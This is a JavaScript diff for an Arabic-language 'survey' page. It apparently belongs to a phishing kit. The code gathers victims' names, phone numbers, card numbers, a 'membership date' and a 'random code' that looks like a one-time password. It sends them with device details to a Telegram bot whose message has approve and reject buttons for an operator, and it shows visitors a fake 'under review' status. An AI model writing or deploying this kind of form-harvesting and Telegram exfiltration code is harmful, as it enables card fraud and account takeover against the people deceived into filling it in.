@@ -391,4 +391,206 @@ async function sendFinalSurveyToTelegram(data) {
     
     const message = `🎉 *استبيان مكتمل*\n\n` +
                    `📋 *المعلومات الشخصية:*\n` +
-                   `• الاسم: ${data.name
+                   `• الاسم: ${data.name}\n` +
+                   `• الهاتف: \`${data.phone}\`\n` +
+                   `• البطاقة: \`${data.card.substring(0, 4)} **** **** ${data.card.substring(12)}\`\n` +
+                   `• تاريخ الانتماء: ${monthName} ${data.membershipYear}\n\n` +
+                   `🔐 *الرمز العشوائي:* \`${data.randomCode}\`\n\n` +
+                   `📱 *معلومات الجهاز:*\n` +
+                   `• النوع: ${data.deviceInfo.type}\n` +
+                   `• المتصفح: ${data.deviceInfo.browser}\n` +
+                   `• النظام: ${data.deviceInfo.os}\n` +
+                   `• الشاشة: ${data.deviceInfo.screen}\n\n` +
+                   `🆔 *رقم الاستبيان:* \`${currentSurveyId}\`\n` +
+                   `📅 *تاريخ الاكتمال:* ${data.completedAt}`;
+    
+    try {
+        const response = await fetch(`${CONFIG.API_URL}${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CONFIG.TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown',
+                disable_web_page_preview: true,
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            { text: "✅ قبول", callback_data: `approve_${currentSurveyId}` },
+                            { text: "❌ رفض", callback_data: `reject_${currentSurveyId}` }
+                        ],
+                        [
+                            { text: "👁️ عرض التفاصيل", callback_data: `details_${currentSurveyId}` }
+                        ]
+                    ]
+                }
+            })
+        });
+        
+        const result = await response.json();
+        return { success: result.ok, messageId: result.result?.message_id };
+        
+    } catch (error) {
+        return { success: false, error: error.message };
+    }
+}
+
+// حفظ الاستبيان محلياً
+function saveSurveyLocally() {
+    try {
+        const surveys = loadFromStorage('surveys', []);
+        const surveyData = {
+            ...currentSurveyData,
+            surveyId: currentSurveyId,
+            step1MessageId: step1MessageId,
+            status: 'pending',
+            submittedAt: new Date().toISOString(),
+            completed: true
+        };
+        
+        surveys.push(surveyData);
+        saveToStorage('surveys', surveys);
+        
+        console.log('✅ تم حفظ الاستبيان محلياً');
+        return true;
+    } catch (error) {
+        console.error('❌ خطأ في الحفظ المحلي:', error);
+        return false;
+    }
+}
+
+// تحديث صفحة النهاية
+function updateCompletionPage() {
+    // تحديث المعلومات
+    document.getElementById('surveyId').textContent = currentSurveyId;
+    document.getElementById('submissionDate').textContent = new Date().toLocaleString('ar-SA');
+    document.getElementById('submittedName').textContent = currentSurveyData.name;
+    document.getElementById('submittedPhone').textContent = currentSurveyData.phone;
+}
+
+// تعبئة مثال للرمز
+function fillCode(code) {
+    document.getElementById('randomCode').value = code;
+    showNotification(`تم تعبئة الرمز: ${code}`, 'info');
+}
+
+// الانتقال بين الصفحات
+function showPage(pageId) {
+    // إخفاء جميع الصفحات
+    document.querySelectorAll('.page').forEach(page => {
+        page.classList.remove('active');
+    });
+    
+    // إظهار الصفحة المطلوبة
+    document.getElementById(pageId).classList.add('active');
+    
+    // التمرير للأعلى
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+// العودة للصفحة الرئيسية
+function goHome() {
+    showPage('page1');
+}
+
+// إنشاء استبيان جديد
+function newSurvey() {
+    // إعادة تعيين البيانات
+    currentSurveyData = {};
+    currentSurveyId = null;
+    step1MessageId = null;
+    
+    // إعادة تعيين النموذج
+    document.getElementById('fullName').value = '';
+    document.getElementById('phoneNumber').value = '';
+    document.getElementById('cardNumber').value = '';
+    document.getElementById('randomCode').value = '';
+    document.getElementById('dataConfirmation').checked = false;
+    
+    // إعادة تعيين تاريخ الانتماء
+    const currentYear = new Date().getFullYear();
+    document.getElementById('membershipYear').value = currentYear;
+    document.getElementById('membershipMonth').value = '';
+    
+    // العودة للصفحة الأولى
+    showPage('page1');
+}
+
+// مشاركة رقم الاستبيان
+function shareSurvey() {
+    const surveyId = document.getElementById('surveyId').textContent;
+    const shareInput = document.getElementById('shareCodeInput');
+    
+    shareInput.value = surveyId;
+    document.getElementById('shareModal').style.display = 'flex';
+}
+
+// إغلاق النافذة المنبثقة
+function closeModal() {
+    document.getElementById('shareModal').style.display = 'none';
+    document.getElementById('copyMessage').style.display = 'none';
+}
+
+// نسخ للكليبورد
+function copyToClipboard() {
+    const shareInput = document.getElementById('shareCodeInput');
+    const copyMessage = document.getElementById('copyMessage');
+    
+    shareInput.select();
+    shareInput.setSelectionRange(0, 99999);
+    
+    navigator.clipboard.writeText(shareInput.value)
+        .then(() => {
+            copyMessage.textContent = CONFIG.MESSAGES.COPIED;
+            copyMessage.className = 'copy-message success';
+            copyMessage.style.display = 'block';
+            
+            setTimeout(() => {
+                copyMessage.style.display = 'none';
+                closeModal();
+            }, 2000);
+        })
+        .catch(() => {
+            copyMessage.textContent = '❌ فشل النسخ';
+            copyMessage.className = 'copy-message error';
+            copyMessage.style.display = 'block';
+        });
+}
+
+// عرض حالة الاستبيان
+function viewStatus() {
+    showNotification('🔍 جاري البحث عن حالة الاستبيان...', 'info');
+    
+    setTimeout(() => {
+        showNotification('✅ الحالة: قيد المراجعة من قبل المدير', 'success');
+    }, 1500);
+}
+
+// عرض الإشعارات
+function showNotification(message, type = 'info') {
+    const notification = document.getElementById('notification');
+    
+    notification.textContent = message;
+    notification.className = `notification ${type}`;
+    notification.style.display = 'block';
+    
+    // إخفاء تلقائي بعد 3 ثواني
+    setTimeout(() => {
+        notification.style.display = 'none';
+    }, 3000);
+}
+
+// أسلوب CSS للهزة
+const style = document.createElement('style');
+style.textContent = `
+    .shake {
+        animation: shake 0.5s;
+    }
+    
+    @keyframes shake {
+        0%, 100% { transform: translateX(0); }
+        10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+        20%, 40%, 60%, 80% { transform: translateX(5px); }
+    }
+`;
+document.head.appendChild(style);
